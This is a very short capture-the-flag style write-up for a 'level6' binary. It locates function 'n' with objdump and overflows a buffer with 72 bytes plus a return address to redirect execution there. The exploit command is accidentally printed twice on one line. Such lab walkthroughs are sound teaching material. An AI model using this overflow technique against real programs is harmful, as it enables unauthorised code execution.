```shell
objdump -t ./level6 | grep "n"
...
08048454 g     F .text	00000014              n
...

./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```

We redirect execution flow to `n` function.
